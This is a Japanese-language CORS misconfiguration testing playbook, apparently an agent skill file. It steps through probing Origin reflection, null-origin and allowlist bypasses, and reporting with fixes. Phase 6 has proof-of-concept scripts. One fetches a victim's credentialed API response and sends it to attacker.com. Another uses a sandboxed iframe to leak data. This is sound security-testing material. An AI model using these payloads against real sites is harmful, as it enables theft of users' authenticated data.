# CORS Misconfiguration Testing

`client-side` の Phase 4 から呼ばれる、CORS allow-origin / credentials 漏洩経路の単独深掘り。

## いつ切替えるか

- API endpoint が `Access-Control-Allow-Origin` を返す
- SPA / frontend が cross-origin で fetch を行う構成
- `credentials: 'include'` 経由の sensitive data 取得が可能か検証する場面

## Phase 1 — base 応答確認

```
curl -s -i 'https://target/api/me' -H 'Origin: https://attacker.com'
```

返ってくる header を読む:

```
Access-Control-Allow-Origin: ?
Access-Control-Allow-Credentials: ?
Access-Control-Allow-Methods: ?
Access-Control-Allow-Headers: ?
Access-Control-Expose-Headers: ?
Vary: Origin
```

## Phase 2 — pattern 別の検出

| pattern | 試験 | 危険度 |
|---|---|---|
| `ACAO: *` + `ACAC: ` (なし) | 既定 SOP のまま | 低 |
| `ACAO: *` + `ACAC: true` | invalid (ブラウザは reject) | 中 (一部 lib bug あり) |
| `ACAO: <reflected origin>` + `ACAC: true` | 任意 origin から credentials 付き fetch 可 | **致命** |
| `ACAO: null` + `ACAC: true` | sandbox iframe / data URL から credentials | **致命** |
| `ACAO: https://target.com.attacker.com` 通る | suffix match の脆弱 | **致命** |
| `ACAO: https://target.attacker.com` 通る | prefix match の脆弱 | **致命** |
| `ACAO: https://attacker-target.com` 通る | substring match | **致命** |

## Phase 3 — Origin reflect の確認

```
curl -i https://target/api/me -H 'Origin: https://attacker.com'
→ Access-Control-Allow-Origin: https://attacker.com  ← reflect 確認
→ Access-Control-Allow-Credentials: true             ← credentials 込み
```

## Phase 4 — null origin

`null` origin は以下の場面で発火:

- `<iframe sandbox>` (allow-same-origin 無し)
- data: URL からの fetch
- file: URL からの fetch
- redirect chain 経由

```
curl -i https://target/api/me -H 'Origin: null'
→ Access-Control-Allow-Origin: null
→ Access-Control-Allow-Credentials: true   ← null + true は致命
```

## Phase 5 — origin allowlist の bypass パターン

```
target.com の allowlist を以下で迂回:
  https://eviltarget.com           # prefix match
  https://target.com.evil.com      # suffix match
  https://target-com.evil.com      # underscore / hyphen confusion
  https://TARGET.com               # case difference
  https://xn--target-evil.com      # punycode
  https://target.com:8080@evil.com # userinfo trick
```

## Phase 6 — PoC

reflected origin + credentials のとき:

```html
<script>
fetch('https://target/api/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => {
    fetch('https://attacker.com/log?d='+encodeURIComponent(t));
  });
</script>
```

null origin のとき:

```html
<iframe sandbox src="data:text/html,<script>fetch('https://target/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>parent.postMessage(d,'*'))</script>"></iframe>
```

## Phase 7 — preflight 経由の bypass

`OPTIONS` の応答が緩すぎる場合:

```
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: *
Access-Control-Allow-Origin: <reflected>
```

custom header / 任意 method を任意 origin から飛ばせる。`Authorization` / `X-API-Key` も含めて exfil 可能。

## Phase 8 — レポート

```
- 対象 endpoint
- 観測した CORS header 全文
- 攻撃 origin と reflected response
- PoC コード
- 影響 (機密 API データの cross-origin 漏洩)
- 修正 (allowlist 完全一致 / null 拒否 / wildcard + credentials 不可)
```

## Tools

```
curl
burp (CORS Scanner)
WebFetch
Bash (sandbox)
```
